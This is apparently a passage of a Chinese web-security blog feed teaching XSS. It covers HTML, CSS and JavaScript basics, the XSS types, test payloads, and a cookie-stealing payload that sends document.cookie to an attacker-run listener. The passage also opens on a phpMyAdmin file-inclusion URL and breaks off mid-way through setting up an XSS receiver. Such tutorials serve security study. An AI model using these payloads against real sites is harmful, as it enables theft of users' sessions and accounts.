class="line">http://127.0.0.1/phpMyAdmin/index.php?target=db_sql.php%253f/../../../tmp/tmp/sess_tl5epcif7ahh0vbb7j59nvi0ppab23a0&amp;S=phpinfo();</span><br></pre></td></tr></table></figure></li></ol>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>XSS攻击漏洞</title>
      <link href="/2025/03/21/XSS%E6%94%BB%E5%87%BB%E6%BC%8F%E6%B4%9E/"/>
      <url>/2025/03/21/XSS%E6%94%BB%E5%87%BB%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="XSS攻击漏洞"><a href="#XSS攻击漏洞" class="headerlink" title="XSS攻击漏洞"></a>XSS攻击漏洞</h1><h3 id="一、前端基础"><a href="#一、前端基础" class="headerlink" title="一、前端基础"></a>一、前端基础</h3><p>前端即网站前台部分，运行在PC端，移动端等浏览器上展现给用户浏览的网页。前端技术一般分为前端设计和前端开发。前端设计一般可以理解为网站的视觉设计；前端开发是创建WEB页面或APP等前端界面呈现给用户的过程，通过HTML，CSS及JavaScript以及衍生出来的各种技术、框架、解决方案，来实现互联网产品的用户界面交互。</p><h4 id="1-HTML基础"><a href="#1-HTML基础" class="headerlink" title="1. HTML基础"></a>1. HTML基础</h4><p>超文本标记语言（英语：HyperText Markup Language，简称：HTML）是一种用于创建网页的标准标记语言。</p><h5 id="1-认识HTML"><a href="#1-认识HTML" class="headerlink" title="(1) 认识HTML"></a>(1) 认识HTML</h5><p>点开任何网页，右击，都会出现显示“查看源代码”的选项，就可以看到清晰的HTML代码。html文件是一个文本文件，由浏览器执行。HTML文件通常都是以<code>&lt;!DOCTYPE html&gt;</code>开始，以<code>&lt;/html&gt;</code>结尾。</p><h5 id="2-HTML结构"><a href="#2-HTML结构" class="headerlink" title="(2) HTML结构"></a>(2) HTML结构</h5><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">title</span>&gt;</span>基本HTML结构<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">h1</span>&gt;</span>我是一级标题<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">p</span>&gt;</span>我是一段文本段落<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>解释：</p><ul><li><code>&lt;!DOCTYPE html&gt;</code>：是html5标准网页声明，告诉浏览器使用哪个HTML版本进行解析。</li><li><code>&lt;html&gt;</code>：顶级元素或根元素；只能包含<code>&lt;head&gt;</code>元素或者<code>&lt;body&gt;</code>元素。</li><li><code>&lt;head&gt;</code>：元数据，如文件名、创建时间、修改时间等。</li><li><code>&lt;title&gt;</code>：表示页面的名称。</li><li><code>&lt;body&gt;</code>：存放页面的内容。</li></ul><h5 id="A-HTML元素"><a href="#A-HTML元素" class="headerlink" title="A. HTML元素"></a>A. HTML元素</h5><p>一个成对出现的结构称之为元素，一般由开始标签、内容及结束标签构成，开始标签可以添加一些属性来修饰元素。并不是所有的元素都是成对出现的，也有一些元素只有开始标签，没有结束标签，这种元素可称为空元素，属于单标签元素。如：图片元素<code>&lt;img&gt;</code>。</p><h5 id="B-HTML注释"><a href="#B-HTML注释" class="headerlink" title="B. HTML注释"></a>B. HTML注释</h5><p>注释是编写程序时，写程序的人给一个语句、程序段、函数等的解释或提示，能提高程序代码的可读性。HTML注释使用<code>&lt;!--</code>开始，<code>--&gt;</code>结尾。例如：</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 这是一个注释，注释的内容不在浏览器显示--&gt;</span></span><br></pre></td></tr></table></figure><h5 id="C-HTML属性"><a href="#C-HTML属性" class="headerlink" title="C. HTML属性"></a>C. HTML属性</h5><p>属性可以为HTML标签提供一些额外信息，或者对HTML标签进行修饰。属性总是以名称&#x2F;值对的形式出现，比如：<code>name=&quot;value&quot;</code>。一般属性都具有以下特征：</p><ul><li>每个属性之间或与元素名之间都有一个空格隔开。</li><li>属性名后面紧跟等号。</li><li>属性值必须使用双引号包裹。<br>但也有一些属性只有属性名，没有属性值，这种属性我们称之为布尔属性，只有：true或false。如下<code>disabled</code>就是布尔属性，表示是否禁用，有该属性则为禁用：</li></ul><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">disabled</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="2-CSS基础"><a href="#2-CSS基础" class="headerlink" title="2. CSS基础"></a>2. CSS基础</h4><p>CSS (Cascading Style Sheets，层叠样式表），是一种用来为结构化文档（如HTML文档或XML应用）添加样式（字体、间距和颜色等）的计算机语言，CSS文件扩展名为<code>.css</code>。</p><h5 id="1-CSS语法"><a href="#1-CSS语法" class="headerlink" title="(1) CSS语法"></a>(1) CSS语法</h5><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">h1</span> &#123;</span><br><span class="line"> <span class="attribute">color</span>: red;</span><br><span class="line"> <span class="attribute">font-size</span>: <span class="number">20px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>释义：</p><ul><li><code>h1</code>：选择器。</li><li><code>;</code>：分隔符。</li><li><code>color:red</code>和<code>font-size:20px</code>：声明语句。</li><li><code>color</code>和<code>font-size</code>：属性。</li><li><code>red</code>和<code>20px</code>：值。</li></ul><h5 id="2-CSS注释"><a href="#2-CSS注释" class="headerlink" title="(2) CSS注释"></a>(2) CSS注释</h5><p>CSS注释的作用也差不多，只是语法不同，其语法如下：</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 这是一行单行注释 */</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">这个注释分散</span></span><br><span class="line"><span class="comment">在多个行上面</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h5 id="3-HTML引用CSS"><a href="#3-HTML引用CSS" class="headerlink" title="(3) HTML引用CSS"></a>(3) HTML引用CSS</h5><ul><li><strong>行内引入</strong>：通过给元素添加<code>style</code>属性来添加样式。例如：</li></ul><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">title</span>&gt;</span>CSS 学习<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">h1</span> <span class="attr">style</span>=<span class="string">&quot;color: red;&quot;</span>&gt;</span>我是一个红色标题<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">&quot;color: red;&quot;</span>&gt;</span>我是一个段落文字<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li><strong>内嵌方式</strong>：通过在<code>&lt;head&gt;</code>元素中使用<code>&lt;style&gt;</code>元素来定义。例如：</li></ul><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">title</span>&gt;</span>CSS 学习<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css"> <span class="selector-tag">h1</span> &#123;</span></span><br><span class="line"><span class="language-css"> <span class="attribute">color</span>: red;</span></span><br><span class="line"><span class="language-css"> &#125;</span></span><br><span class="line"><span class="language-css"> </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">h1</span>&gt;</span>这是一个一级标题<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li><strong>外链方式</strong>：通过在<code>&lt;head&gt;</code>元素中使用<code>&lt;link&gt;</code>元素来引入。例如：</li></ul><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">title</span>&gt;</span>CSS 学习<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span> <span class="attr">href</span>=<span class="string">&quot;style.css&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">h1</span>&gt;</span>这是一个一级标题<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>style.css:</p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">h1</span> &#123;</span><br><span class="line"> <span class="attribute">color</span>: red;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>其实除了上面三种方式之外，还有第四种方法，就是<code>@import</code>导入的方式。</p><h4 id="3-JavaScript基础"><a href="#3-JavaScript基础" class="headerlink" title="3. JavaScript基础"></a>3. JavaScript基础</h4><p>JavaScript是一种脚本，一门编程语言，它可以在网页上实现复杂的功能，网页展现给你的不再是简单的静态信息，而是实时的内容更新，交互式的地图，2D&#x2F;3D动画，滚动播放的视频等等。</p><h5 id="1-BOM"><a href="#1-BOM" class="headerlink" title="(1) BOM"></a>(1) BOM</h5><p>浏览器对象模型，JS通过BOM访问浏览器相关的信息，对浏览器进行交互，获取宽高，改变当前窗口的地址。通常用来证明漏洞的存在，比如XSS漏洞。</p><h5 id="2-事件"><a href="#2-事件" class="headerlink" title="(2) 事件"></a>(2) 事件</h5><p>事件是用户与web页面交互时发生的事情，例如单击链接或按钮、向输入框或文本区输入文本、在选择框中进行选择、按键盘上的键、移动鼠标指针、提交表单等。在某些情况下，浏览器本身可以触发事件，例如页面加载和卸载事件。</p><h5 id="3-事件处理程序"><a href="#3-事件处理程序" class="headerlink" title="(3) 事件处理程序"></a>(3) 事件处理程序</h5><p>事件处理程序，事件就是用户与浏览器交互后执行的某种动作，而响应某个事件的函数叫做事件处理程序(事件侦听器)。按照惯例，事件处理程序的名称总是以“on”开头，因此单击事件的事件处理程序称为<code>onclick</code>，加载事件的事件处理程序称为<code>onload</code>，模糊事件的事件处理程序称为<code>onblur</code>等。</p><h5 id="4-HTML引用JavaScript"><a href="#4-HTML引用JavaScript" class="headerlink" title="(4) HTML引用JavaScript"></a>(4) HTML引用JavaScript</h5><ul><li><strong>代码块</strong>：</li></ul><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">title</span>&gt;</span>HTML中嵌入JS代码的第一种方式<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"> <span class="variable language_">window</span>.<span class="title function_">alert</span>(<span class="string">&quot;head............&quot;</span>);</span></span><br><span class="line"><span class="language-javascript"> </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;我是一个按钮对象1&quot;</span> /&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"> <span class="variable language_">window</span>.<span class="title function_">alert</span>(<span class="string">&quot;Hello World!&quot;</span>);</span></span><br><span class="line"><span class="language-javascript"> <span class="variable language_">window</span>.<span class="title function_">alert</span>(<span class="string">&quot;Hello JavaScript!&quot;</span>);</span></span><br><span class="line"><span class="language-javascript"> </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;我是一个按钮对象2&quot;</span> /&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li><strong>元素事件引用</strong>：</li></ul><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">title</span>&gt;</span>HTML中嵌入JS代码的第二种方式<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;hello&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;window.alert(&#x27;hello zhangsan&#x27;); window.alert(&#x27;hello lis&#x27;); window.alert(&#x27;hello wangwu&#x27;);&quot;</span>/&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;hello&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;alert(&#x27;hello zhangsan&#x27;); alert(&#x27;hello lis&#x27;); alert(&#x27;hello wangwu&#x27;);&quot;</span>/&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li><strong>引用外部js</strong>：</li></ul><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">title</span>&gt;</span>HTML中嵌入JS代码的第三种方式：引入外部独立的js文件<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;js01.js&quot;</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"> <span class="title function_">alert</span>(<span class="string">&quot;hello jack!&quot;</span>);</span></span><br><span class="line"><span class="language-javascript"> </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>js代码：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="title function_">alert</span>(<span class="string">&quot;hello js!&quot;</span>);</span><br><span class="line"><span class="variable language_">window</span>.<span class="title function_">alert</span>(<span class="string">&quot;hello js!&quot;</span>);</span><br><span class="line"><span class="variable language_">window</span>.<span class="title function_">alert</span>(<span class="string">&quot;hello js!&quot;</span>);</span><br><span class="line"><span class="variable language_">window</span>.<span class="title function_">alert</span>(<span class="string">&quot;hello js!&quot;</span>);</span><br><span class="line"><span class="variable language_">window</span>.<span class="title function_">alert</span>(<span class="string">&quot;hello js!&quot;</span>);</span><br><span class="line"><span class="variable language_">window</span>.<span class="title function_">alert</span>(<span class="string">&quot;ending&quot;</span>);</span><br></pre></td></tr></table></figure><h3 id="二、跨站脚本攻击基础"><a href="#二、跨站脚本攻击基础" class="headerlink" title="二、跨站脚本攻击基础"></a>二、跨站脚本攻击基础</h3><h4 id="1-XSS概念"><a href="#1-XSS概念" class="headerlink" title="1. XSS概念"></a>1. XSS概念</h4><p>跨站脚本（Cross-site scripting，简称XSS）,是指恶意攻击者往Web页面里插入恶意代码，当用户浏览该页之时，嵌入其中Web页面的HTML代码会被执行，从而达到恶意攻击用户的目的。为什么称为xss，依照英文缩写习惯，简称跨站脚本为CSS。这样会引起它和另一个名词“层叠样式表”（Cascading Style Sheets，CSS）的混淆。此CSS非彼CSS。为了以示区别，一些安全人士就习惯将跨站脚本简称为XSS。</p><h4 id="2-XSS漏洞危害"><a href="#2-XSS漏洞危害" class="headerlink" title="2. XSS漏洞危害"></a>2. XSS漏洞危害</h4><ol><li>钓鱼欺骗：最典型的就是利用目标网站的反射型跨站脚本漏洞将目标网站重定向到钓鱼网站，或者注入钓鱼JavaScript以监控目标网站的表单输入，甚至发起基于DHTML更高级的钓鱼攻击方式。</li><li>网站挂马：跨站时利用IFrame嵌入隐藏的恶意网站或者将被攻击者定向到恶意网站上，或者弹出恶意网站窗口等方式都可以进行挂马攻击。</li><li>身份盗用：Cookie是用户对于特定网站的身份验证标志，XSS可以盗取到用户的Cookie，从而利用该Cookie盗取用户对该网站的操作权限。如果一个网站管理员用户Cookie被窃取，将会对网站引发巨大的危害。</li><li>盗取网站用户信息：当能够窃取到用户Cookie从而获取到用户身份使，攻击者可以获取到用户对网站的操作权限，从而查看用户隐私信息。</li><li>垃圾信息发送：比如在SNS社区中，利用XSS漏洞借用被攻击者的身份发送大量的垃圾信息给特定的目标群。</li><li>劫持用户Web行为：一些高级的XSS攻击甚至可以劫持用户的Web行为，监视用户的浏览历史，发送与接收的数据等等。</li><li>XSS蠕虫：XSS蠕虫可以用来打广告、刷流量、挂马、恶作剧、破坏网上数据、实施DDoS攻击等。</li></ol><h4 id="3-XSS的类型"><a href="#3-XSS的类型" class="headerlink" title="3. XSS的类型"></a>3. XSS的类型</h4><p>跨站脚本攻击可以分为三类，反射型、存储型以及DOM型。</p><h5 id="1-反射型"><a href="#1-反射型" class="headerlink" title="(1) 反射型"></a>(1) 反射型</h5><p>也叫做非持久型XSS。攻击者将恶意脚本附加到url的参数中，发送给受害者，服务端未经严格过滤处理而输出在用户浏览器中，导致浏览器执行代码数据。</p><h6 id="A-例子"><a href="#A-例子" class="headerlink" title="A. 例子"></a>A. 例子</h6><p>一个链接，里面的query字段中包含一个script标签，这个标签的src就是恶意代码，用户点击了这个链接后会先向服务器发送请求，服务器返回时也携带了这个XSS代码，然后浏览器将查询的结果写入html，这时恶意代码就被执行了。</p><h6 id="B-流程"><a href="#B-流程" class="headerlink" title="B. 流程"></a>B. 流程</h6><ol><li>攻击者把带有恶意脚本代码参数的URL地址发送给用户。</li><li>用户点击此链接。</li><li>服务器端获取请求参数并且直接使用，服务器反射回结果页面。</li></ol><h5 id="2-存储型"><a href="#2-存储型" class="headerlink" title="(2) 存储型"></a>(2) 存储型</h5><p>也叫做持久型XSS。存储型XSS会被保存到数据库，在其他用户访问到这条数据时，这个代码会在访问用户的浏览器端执行。</p><h6 id="A-例子-1"><a href="#A-例子-1" class="headerlink" title="A. 例子"></a>A. 例子</h6><p>比如攻击者在一篇文章的评论中写入了script标签，这个评论被保存数据库，当其他用户看到这篇文章时就会执行这个脚本。</p><h6 id="B-流程-1"><a href="#B-流程-1" class="headerlink" title="B. 流程"></a>B. 流程</h6><ol><li>攻击者将恶意脚本代码上传或存储到漏洞服务器。</li><li>服务器把恶意脚本保存到服务器。</li><li>当正常客户访问服务器时，服务器会读取恶意数据并且直接使用。</li><li>服务器会返回含有恶意脚本的页面。</li></ol><h5 id="3-DOM型"><a href="#3-DOM型" class="headerlink" title="(3) DOM型"></a>(3) DOM型</h5><p>DOM XSS的XSS代码并不需要服务器解析响应的直接参与，触发XSS靠的就是浏览器端的DOM解析，可以认为完全是客户端的事情。</p><h4 id="4-常见测试代码"><a href="#4-常见测试代码" class="headerlink" title="4. 常见测试代码"></a>4. 常见测试代码</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">onfocus</span>=<span class="string">&quot;write(&#x27;xss&#x27;)&quot;</span> <span class="attr">autofocus</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span> <span class="attr">onerror</span>=<span class="string">&quot;alert(&#x27;xss&#x27;)&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">&quot;alert(&#x27;xss&#x27;)&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;xss&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(&#x27;xss&#x27;)&quot;</span>&gt;</span>clickme<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(123456)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">&#x27;&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(123456)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">&quot;&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(123456)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">title</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(123456)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">&lt;scrip<span class="tag">&lt;<span class="name">script</span>&gt;</span>t&gt;alert(123456)&lt;/scrip<span class="tag">&lt;/<span class="name">script</span>&gt;</span>t&gt;</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(123456)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="三、跨站脚本攻击利用"><a href="#三、跨站脚本攻击利用" class="headerlink" title="三、跨站脚本攻击利用"></a>三、跨站脚本攻击利用</h3><h4 id="1-盗取Cookie"><a href="#1-盗取Cookie" class="headerlink" title="1. 盗取Cookie"></a>1. 盗取Cookie</h4><h5 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h5><ul><li>目标网站没有使用http-only。</li><li>受害者可以访问到接收端。</li><li>获取到cookie后目标用户没有退出登录。</li></ul><h5 id="1-Cookie"><a href="#1-Cookie" class="headerlink" title="(1) Cookie"></a>(1) Cookie</h5><p>Cookie是一种存储在计算机浏览器目录中的文本文件。当用户浏览某个站点并注册帐号，就会生成一个Cookie文件用于记录登录信息。目前，大多数网站都会应用Cookie技术，这既能给用户提供一个好的网络环境，又能方便收集访客信息。</p><h5 id="2-攻击方法"><a href="#2-攻击方法" class="headerlink" title="(2) 攻击方法"></a>(2) 攻击方法</h5><h6 id="A-方法一"><a href="#A-方法一" class="headerlink" title="A. 方法一"></a>A. 方法一</h6><p><strong>攻击者视角</strong><br>首先在公网服务器启动一个用于接收Cookie的WEB服务，既可以使用python启动，也可以使用Apache启动。因为受害者与攻击者处于各自的局域网之中，两者之间是无法通信的。如果你想要获取到受害者的Cookie，则必须要使得受害者能与攻击者进行通信，所以攻击者需要在公网里启动。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 -m http.server --<span class="built_in">bind</span> 0.0.0.0 2333</span><br></pre></td></tr></table></figure><p>然后在XSS漏洞的地方插入攻击代码：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="title function_">open</span>(<span class="string">&#x27;http://192.168.81.238:2333/?q=&#x27;</span>+<span class="title function_">btoa</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>))</span><br></pre></td></tr></table></figure><p>JavaScript可以使用<code>document.cookie</code>属性来创建、读取、及删除cookie。<code>window.open</code>常用来在新的window或新的tab页打开一个页面或文件（如图片、PDF等)。<code>btoa</code>进行base64编码。</p><p><strong>受害者视角</strong><br>受害者访问了攻击者插入了xss代码的网页，触发了漏洞，在浏览器打开新的一个页面，并将浏览器的cookie发送到攻击者服务器。</p><p><strong>攻击者视角</strong><br>启动的WEB服务接收到受害者浏览器携带Cookie发出的请求。</p><h6 id="B-方法二"><a href="#B-方法二" class="headerlink" title="B. 方法二"></a>B. 方法二</h6><p>利用现有的XSS平台，XSS平台是一个测试XSS漏洞获取cookie的平台，XSS可以做JavaScript能做的所有事，包括但不限于窃取cookie、后台增删改文章、钓鱼、利用XSS漏洞进行传播、修改网页代码、网站重定向、获取用户信息等。</p><p><strong>攻击者视角</strong><br>首先准备一个XSS平台用以接收Cookie，在网上其实有很多这种平台，但其实有的平台存在黑吃黑的现象。所以为了安全起见可以自行搭建。<br>BlueLotus_XSSReceiver清华大学蓝莲花战队成员做的一个平台，优点是足够小，不需要数据库，只要有个能运行php的环境就可以了，缺点是一般只适合一个人用。<br>下载BlueLotus_XSSReceiver，解压后放到虚拟机里。<br>这里使用docker搭建xss平台，<br>第一步：拉取docker镜像</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> docker pull romeoz/docker-apache-php:5.6</span><br></pre></td></tr></table></figure><p>第二步：利用镜像启动一个容器并挂载xss平台的目录</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> docker run -d -p 9944:80 -v ./bluelotus:/var/www/app 